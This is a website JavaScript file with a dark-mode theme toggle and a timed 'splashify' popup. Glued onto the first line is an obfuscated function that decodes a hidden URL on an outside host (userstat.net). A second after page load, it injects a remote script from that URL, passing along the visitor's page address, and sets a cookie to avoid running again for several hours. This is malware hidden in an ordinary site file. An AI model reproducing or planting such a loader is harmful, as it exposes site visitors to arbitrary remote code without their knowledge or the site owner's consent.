document.addEventListener("DOMContentLoaded",(function(){const toggleSwitch=document.getElementById("toggle");toggleSwitch.addEventListener("change",(function switchTheme(){toggleSwitch.checked?document.documentElement.setAttribute("data-theme","dark"):document.documentElement.removeAttribute("data-theme")}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

document.addEventListener("DOMContentLoaded", function() {
  // Function to display the popup after a delay
  function displayPopupAfterDelay(delay) {
    setTimeout(function() {
      var popup = document.getElementById("splashify-popup");
      popup.style.display = "flex"; // Display as flex to apply flexbox centering
    }, delay);
  }

  // Function to display the popup again if the user stays on the site for over 1 minute
  function displayPopupAgain() {
    setTimeout(function() {
      var popup = document.getElementById("splashify-popup");
      popup.style.display = "flex"; // Display as flex to apply flexbox centering
    }, 60000); // 1 minute (60000 milliseconds)
  }

  // Display the popup after 10 seconds
  displayPopupAfterDelay(10000); // 10 seconds

  // Display the popup again if the user stays on the site for over 1 minute
  displayPopupAgain();

});

function closePopup() {
  var popup = document.getElementById("splashify-popup");
  popup.style.display = "none";
}